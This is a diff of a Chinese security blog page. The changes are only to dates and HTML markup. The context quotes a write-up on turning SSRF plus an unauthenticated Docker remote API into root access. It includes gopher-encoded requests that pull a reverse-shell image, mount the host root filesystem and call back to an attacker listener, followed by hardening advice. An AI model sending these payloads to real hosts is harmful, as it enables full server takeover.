@@ -130,7 +130,7 @@
 <meta property="og:image" content="https://hexo.imagemlt.xyz/post/SSRF-DOCKER-RCE/getshell.png">
 <meta property="og:image" content="http://image.3001.net/images/20180806/1533550066_5b681df2b82f9.png!small">
 <meta property="og:image" content="https://hexo.imagemlt.xyz/post/SSRF-DOCKER-RCE/flow.png">
-<meta property="og:updated_time" content="2019-07-06T15:27:08.093Z">
+<meta property="og:updated_time" content="2019-02-02T00:29:25.000Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="利用SSRF攻击docker remote api从而获取服务器root权限的探索">
 <meta name="twitter:description" content="首发于freebuf http://www.freebuf.com/articles/web/179910.html   这几天在做关于自动化部署docker镜像方面的项目，从而接触到了docker的api，而docker的api也可以通过tcp连接的形式来进行访问。那么从一个安全爱好者的角度出发，是否可以利用docker的远程api来实现提权等一系列的操作？查找了各种资料之后，最后我探索到了一">
@@ -191,7 +191,7 @@
 
 </head>
 
-<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-Hans">
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
 	<a href="https://github.com/imagemlt"><img style="position: absolute; top: 0; right: 0; border: 0;z-index:1" src="https://s3.amazonaws.com/github/ribbons/forkme_right_orange_ff7600.png" alt="Fork me on GitHub"></a>
   
   
@@ -201,7 +201,7 @@
   <div class="container sidebar-position-left page-post-detail">
     <div class="headband"></div>
 
-    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
       <div class="header-inner"><div class="site-brand-wrapper">
   <div class="site-meta ">
     
@@ -327,20 +327,20 @@
 
   
 
-  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
   
   
   
   <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://hexo.imagemlt.xyz/post/SSRF-DOCKER-RCE/index.html">
 
-    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="Imagemlt">
       <meta itemprop="description" content="personal blog">
       <meta itemprop="image" content="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4">
     </span>
 
-    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
       <meta itemprop="name" content="Image's blog">
     </span>
 
@@ -391,7 +391,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-06 23:27:08" itemprop="dateModified" datetime="2019-07-06T23:27:08+08:00">2019-07-06</time>
+                <time title="Modified: 2019-02-02 08:29:25" itemprop="dateModified" datetime="2019-02-02T08:29:25+08:00">2019-02-02</time>
               
             
           </span>
@@ -408,7 +408,7 @@
                 <span class="post-meta-item-text">In</span>
               
               
-                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing"><a href="/categories/web/" itemprop="url" rel="index"><span itemprop="name">web</span></a></span>
 
                 
                 
@@ -494,19 +494,19 @@
 <p>这个post封包的目标是让远程主机从dockerhub下载我们需要的镜像。构造为gopher格式为：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/images/create%3FfromImage%3Dimagemlt/reverse_shell%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%200%0AContent-Type%3A%20text/plain%0A X-Registry-Auth:%20e30%3D%0A%0A</span><br></pre></td></tr></table></figure>
 <p>通过ssrf的点触发即可在远程服务器下载我们的镜像。<img src="http://image.3001.net/images/20180806/1533549895_5b681d4734a8a.png!small" alt="pull.png"></p>
-<p><img src="./pull.png" alt=""></p>
+<p><img src="./pull.png" alt></p>
 <p>之后再创建容器</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/create HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 99</span><br><span class="line">Content-Type: application/json</span><br><span class="line"></span><br><span class="line">&#123;&quot;Cmd&quot;:[&quot;your ip&quot;,&quot;3456&quot;],&quot;Image&quot;:&quot;imagemlt/reverse_shell&quot;,&quot;HostConfig&quot;:&#123;&quot;Binds&quot;:[&quot;/:/hostOS&quot;]&#125;&#125;</span><br></pre></td></tr></table></figure>
 <p>将封包包装为gopher的形式：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher://172.17.0.1:4243/_POST%20/v1.24/containers/create%20HTTP/1.1%0AHost%3A%20localhost%3A4243%0AUser-Agent%3A%20Docker-Client/18.03.1-ce%20%28linux%29%0AContent-Length%3A%2099%0AContent-Type%3A%20application/json%0A%0A%7B%22Cmd%22%3A%5B%22your ip%22%2C%223456%22%5D%2C%22Image%22%3A%22imagemlt/reverse_shell%22%2C%22HostConfig%22%3A%7B%22Binds%22%3A%5B%22/%3A/hostOS%22%5D%7D%7D%0A%0d%0a</span><br></pre></td></tr></table></figure>
 <p>这里我们再最后多加了一些%0d%0a从而让连接能够断开。然后利用之前的ssrf的地方请求这个url，可以获得创建的容器id：<img src="http://image.3001.net/images/20180806/1533549978_5b681d9a90183.png!small" alt="create.png"></p>
-<p><img src="./create.png" alt=""></p>
+<p><img src="./create.png" alt></p>
 <p>获取id后我们再post相应的使容器运行的封包：</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">POST /v1.24/containers/5a42a09f7bb889f53943015346682388d40a151ec5bad30024282eee11811380/start HTTP/1.1</span><br><span class="line">Host: localhost:4243</span><br><span class="line">User-Agent: Docker-Client/18.03.1-ce (linux)</span><br><span class="line">Content-Length: 0</span><br><span class="line">Content-Type: application/json</span><br></pre></td></tr></table></figure>
 <p>我们的服务器端nc端口3456，构造gopher格式的url候再次发送封包：</p>
 <p><img src="http://image.3001.net/images/20180806/1533550032_5b681dd030497.png!small" alt="attack.png"><img src="http://image.3001.net/images/20180806/1533550043_5b681ddb80ec8.png!small" alt="getshell.png"></p>
-<p><img src="./attack.png" alt="">可以看到服务器端成功返回shell，且已成功挂载宿主机根目录到/hostOS下。</p>
-<p><img src="./getshell.png" alt=""></p>
+<p><img src="./attack.png" alt>可以看到服务器端成功返回shell，且已成功挂载宿主机根目录到/hostOS下。</p>
+<p><img src="./getshell.png" alt></p>
 <p>这样我们便通过ssrf与docker未授权api完成了一次攻击，并且获取了宿主机的root权限！</p>
 <p>除了反弹shell的方法，我们也可以借助写crontab的方法来获得最后的shell，这里便不再赘述。</p>
 <h2 id="如何防范？"><a href="#如何防范？" class="headerlink" title="如何防范？"></a>如何防范？</h2><p>在不必需的情况下，不要启用docker的remote api服务，如果必须使用的话，可以采用如下的加固方式：</p>
@@ -523,7 +523,7 @@
 <p>这样便可以避免未授权的docker api被远程利用。</p>
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>未授权的docker remote api具有极大的风险，当结合ssrf漏洞时可以作为渗透测试扩展供给面的工具，最后获得root shell.因此我们做开发时应该严格防范。最后总结一下我们的攻击思路：</p>
 <p><img src="http://image.3001.net/images/20180806/1533550066_5b681df2b82f9.png!small" alt="flow.png"></p>
-<p><img src="./flow.png" alt=""></p>
+<p><img src="./flow.png" alt></p>
 <h2 id="参考资料"><a href="#参考资料" class="headerlink" title="参考资料"></a>参考资料</h2><ul>
 <li><a href="https://sec.xiaomi.com/article/22">https://sec.xiaomi.com/article/22</a></li>
 <li><a href="http://dockone.io/article/401">http://dockone.io/article/401</a></li>
@@ -637,7 +637,7 @@
 
       <section class="site-overview-wrap sidebar-panel">
         <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
             
               <img class="site-author-image" itemprop="image" src="https://avatars0.githubusercontent.com/u/26888704?s=460&v=4" alt="Imagemlt">
             
@@ -695,9 +695,7 @@
                     
                       
                     
-                      
-                    
-                    <span class="site-state-item-count">16</span>
+                    <span class="site-state-item-count">15</span>
                     <span class="site-state-item-name">categories</span>
                   </a>
                 </div>
@@ -732,9 +730,7 @@
                     
                       
                     
-                      
-                    
-                    <span class="site-state-item-count">12</span>
+                    <span class="site-state-item-count">11</span>
                     <span class="site-state-item-name">tags</span>
                   </a>
                 </div>
